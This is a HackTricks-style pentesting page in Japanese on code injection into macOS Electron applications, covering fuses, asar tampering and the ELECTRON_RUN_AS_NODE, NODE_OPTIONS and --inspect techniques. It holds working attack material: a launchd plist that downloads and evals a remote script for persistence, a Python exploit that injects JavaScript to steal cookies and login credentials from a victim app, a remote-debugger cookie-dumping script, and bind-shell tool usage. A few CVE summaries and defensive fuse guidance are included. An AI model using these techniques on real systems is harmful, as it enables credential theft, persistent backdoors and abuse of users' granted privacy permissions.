# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 基本情報

Electron が何か知らない場合は、[**こちらに詳しい情報があります**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation)。ここでは、Electron が **node** を実行することだけ覚えておいてください。\
また、node には、指定されたファイル以外のコードを **実行させる** ために使用できる **パラメータ** と **環境変数** があります。

### Electron Fuses

これらの techniques については次に説明しますが、近年の Electron には、これらを防止するための複数の **security flags** が追加されています。これらが [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) であり、macOS の Electron apps が **任意のコードを読み込む** ことを防止するために使用されるものは次のとおりです。<sup>[[1]](#references)</sup>

- **`RunAsNode`**: 無効にすると、環境変数 **`ELECTRON_RUN_AS_NODE`** を使用した code injection を防止します。
- **`EnableNodeCliInspectArguments`**: 無効にすると、`--inspect` や `--inspect-brk` などの params は適用されません。これによる code injection を防止します。
- **`EnableEmbeddedAsarIntegrityValidation`**: 有効にすると、読み込まれた **`asar`** **file** が macOS によって **検証** されます。これにより、この file の内容を変更して行う **code injection** を **防止** します。
- **`OnlyLoadAppFromAsar`**: これを有効にすると、次の順序で読み込み対象を検索する代わりに、**`app.asar`**、**`app`**、最後に **`default_app.asar`** の順で検索することはせず、app.asar のみを確認して使用します。これにより、**`embeddedAsarIntegrityValidation`** fuse と **組み合わせた** 場合に、**検証されていない code** を **読み込む** ことが **不可能** になります。
- **`LoadBrowserProcessSpecificV8Snapshot`**: 有効にすると、browser process は V8 snapshot として `browser_v8_context_snapshot.bin` という file を使用します。

code injection を防止しない、もう 1 つの興味深い fuse は次のとおりです。

- **EnableCookieEncryption**: 有効にすると、disk 上の cookie store は OS level の cryptography keys を使用して暗号化されます。

### Electron Fuses の確認

application から次の方法でこれらの flags を **確認** できます：
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Electron Fusesの変更

[**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode)にあるように、**Electron Fuses**の設定は、文字列 **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** をどこかに含む **Electron binary** 内で設定されています。<sup>[[1]](#references)</sup>

macOSアプリケーションでは、通常 `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` にあります。
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
このファイルを [https://hexed.it/](https://hexed.it/) で開き、先ほどの文字列を検索できます。この文字列の後には、各 fuse が無効か有効かを示す ASCII の数字「0」または「1」があります。hex code（`0x30` は `0`、`0x31` は `1`）を変更して、**fuse の値を変更**してください。

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

これらの bytes を変更した状態で、アプリケーション内の **`Electron Framework` binary** を**上書き**しようとすると、アプリは実行できなくなることに注意してください。

## RCE adding code to Electron Applications

Electron App が使用している **external JS/HTML files** が存在する場合があります。そのため、攻撃者はこれらのファイルにコードを inject できます。これらのファイルの signature はチェックされないため、App の context で arbitrary code を実行できます。

> [!CAUTION]
> ただし、現時点では 2 つの制限があります。
>
> - App を変更するには **`kTCCServiceSystemPolicyAppBundles`** permission が**必要**なため、デフォルトではこれができなくなっています。
> - compiled **`asap` file** では通常、fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** が **enabled** になっています。
>
> これにより、この attack path はさらに複雑（または不可能）になります。

アプリケーションを別の directory（**`/tmp`** など）にコピーし、folder **`app.app/Contents`** の名前を **`app.app/NotCon`** に変更し、**malicious** code を含む **asar** file に**変更**を加え、再び **`app.app/Contents`** に戻して実行することで、**`kTCCServiceSystemPolicyAppBundles`** の要件を bypass できることに注意してください。<sup>[[5]](#references)</sup>

asar file から code を unpack するには、次のコマンドを使用します。
```bash
npx asar extract app.asar app-decomp
```
変更を加えた後、次の方法で再パッケージ化します：
```bash
npx asar pack app-decomp app-new.asar
```
## ELECTRON_RUN_AS_NODE による RCE

[**docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node) によると、この環境変数が設定されている場合、プロセスは通常の Node.js プロセスとして起動します。<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> fuse **`RunAsNode`** が無効になっている場合、環境変数 **`ELECTRON_RUN_AS_NODE`** は無視されるため、これは機能しません。

### App Plist からの Injection

[**ここで提案されているように**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/)、この環境変数を plist 内で悪用して persistence を維持できます。<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## `NODE_OPTIONS` による RCE

ペイロードを別のファイルに保存して実行できます：
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> fuse **`EnableNodeOptionsEnvironmentVariable`** が **disabled** の場合、起動時に env var **NODE_OPTIONS** は無視されます。ただし、環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されている場合を除きます。この環境変数も fuse **`RunAsNode`** が disabled の場合は無視されます。
>
> **`ELECTRON_RUN_AS_NODE`** を設定しない場合、次の **error** が表示されます: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### App PlistからのInjection

この env variable を plist でabuseし、次の keys を追加して persistence を維持できます:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## inspectingによるRCE

[**こちら**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)によると、**`--inspect`**、**`--inspect-brk`**、**`--remote-debugging-port`**などのflagsを指定してElectron applicationを実行すると、**debug portが開かれる**ため、そこへ接続できます（例：Chromeの`chrome://inspect`から）。そして、**そこへcodeをinject**したり、新しいprocessを起動したりすることも可能です。<sup>[[7]](#references)</sup>\
例：
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
[**このブログ記事**](https://hackerone.com/reports/1274695)では、このデバッグを悪用して、headless Chromeに**任意のファイルを任意の場所へダウンロード**させています。<sup>[[8]](#references)</sup>

> [!TIP]
> アプリに、環境変数や`--inspect`などのパラメータが設定されているかを確認する独自の方法がある場合、arg `--inspect-brk`を使ってruntimeでそれを**bypass**できる可能性があります。これにより、アプリの実行開始時に**実行を停止**させ、bypassを実行できます（例えば、現在のprocessのargsまたは環境変数を上書きする）。

以下は、`--inspect-brk`パラメータを付けてアプリをmonitoringおよび実行することで、アプリが備えていた独自のprotectionをbypassし（`--inspect-brk`を削除するためにprocessのパラメータを上書きし）、その後JS payloadをinjectしてアプリからcookiesとcredentialsをdumpできたexploitです：
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> fuse **`EnableNodeCliInspectArguments`** が無効な場合、起動時に環境変数 **`ELECTRON_RUN_AS_NODE`** が設定されていない限り、アプリは **node parameters**（`--inspect` など）を**無視**します。また、fuse **`RunAsNode`** が無効な場合、環境変数も**無視**されます。
>
> ただし、**electron param `--remote-debugging-port=9229`** は引き続き使用できますが、以前の payload は他のプロセスを実行するためには機能しません。

param **`--remote-debugging-port=9222`** を使用すると、Electron App から **history**（GET commands を使用）やブラウザの **cookies** などの情報を盗むことが可能です（cookies はブラウザ内部で**復号**され、取得できる **json endpoint** が存在するためです）。

その方法は[**こちら**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)と[**こちら**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)で学ぶことができます。また、自動化ツール [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) や、次のような simple script を使用することもできます。<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### App Plist からの Injection

この env variable を plist で悪用し、以下の keys を追加して persistence を維持できます：
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## 古いバージョンを悪用した TCC Bypass

> [!TIP]
> macOS の TCC daemon は、実行された application の version をチェックしません。そのため、以前の technique のいずれを使っても **Electron application に code を inject できない場合**、古い version の APP を download して、その上で code を inject できます。Trust Cache によって阻止されない限り、TCC privileges は引き続き付与されます。

## JS Code 以外を実行する

これまでの technique により、**Electron application の process 内で JS code を実行**できます。ただし、**child process は parent application と同じ sandbox profile で実行され**、その **TCC permissions を継承する**ことを忘れないでください。\
したがって、たとえば camera や microphone にアクセスするために entitlements を abuse したい場合は、**process から別の binary を実行する**だけで済みます。

## 注目すべき Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 および各種の 23-27 pre-release では、`.app/Contents/Resources` folder への write access を持つ attacker が、`embeddedAsarIntegrityValidation` **および** `onlyLoadAppFromAsar` fuses を bypass できました。この bug は integrity checker における *file-type confusion* であり、検証済み archive の代わりに、細工した **`app.asar` という名前の directory** を load させることが可能でした。そのため、その directory 内に置かれた任意の JavaScript が app の起動時に実行されました。hardening guidance に従い、両方の fuse を有効にしていた vendor でさえ、macOS 上では依然として vulnerable でした。<sup>[[3]](#references)</sup>

修正済みの Electron version: **22.3.24**、**24.8.3**、**25.8.1**、**26.2.1**、および **27.0.0-alpha.7**。古い build で動作している application を見つけた attacker は、`Contents/Resources/app.asar` を独自の directory で overwrite し、application の TCC entitlements により code を実行できます。<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

2024 年 1 月、複数の CVE（CVE-2024-23738 から CVE-2024-23743）は、多くの Electron app が **RunAsNode** および **EnableNodeCliInspectArguments** fuses を有効にしたまま ship されていることを明らかにしました。そのため、local attacker は環境変数 `ELECTRON_RUN_AS_NODE=1` や `--inspect-brk` などの flags を使って program を relaunch し、*generic* Node.js process に変えて、application の sandbox および TCC permissions をすべて継承できます。<sup>[[4]](#references)</sup>

Electron team は “critical” rating に異議を唱え、attacker にはすでに local code-execution が必要だと指摘しました。しかし、この issue は post-exploitation において依然として有用です。これは、脆弱な Electron bundle を *living-off-the-land* binary に変え、desktop app に以前付与された Contacts、Photos、その他の sensitive resources などを読み取れるようにするためです。<sup>[[4]](#references)</sup>

Electron maintainers による defensive guidance:<sup>[[4]](#references)</sup>

* production build では `RunAsNode` および `EnableNodeCliInspectArguments` fuses を無効にする。
* application が helper Node.js process を正当に必要とする場合は、それらの fuse を再有効化する代わりに、新しい **UtilityProcess** API を使用する。

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

[**electroniz3r**](https://github.com/r3ggi/electroniz3r) tool は、インストールされている **vulnerable electron applications を見つけて**、それらに code を inject するために簡単に使用できます。この tool は **`--inspect`** technique を使用します:<sup>[[5]](#references)</sup>

自分で compile する必要があり、次のように使用できます:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Lokiは、アプリケーションの JavaScript ファイルを Loki Command & Control の JavaScript ファイルに置き換えることで、Electron applications に backdoor を仕込むよう設計されました。

## References

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [Third-Party Frameworks 経由の macOS Injection - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ファイルタイプの混同による ASAR Integrity bypass (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] ['runAsNode' CVEs に関する声明 - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - Red Teaming における新たな武器 - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Electron applications が秘密情報を confidential に保存できない理由: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging が任意のファイルを download するために悪用される](https://hackerone.com/reports/1274695)
- [9] [Cookie Jar に手を入れる: Chromium の Remote Debugger Port で Cookie を Dumping - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Chromium の Remote Debugger で Cookie Dumping の失敗を Debugging - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
{{#include ../../../banners/hacktricks-training.md}}
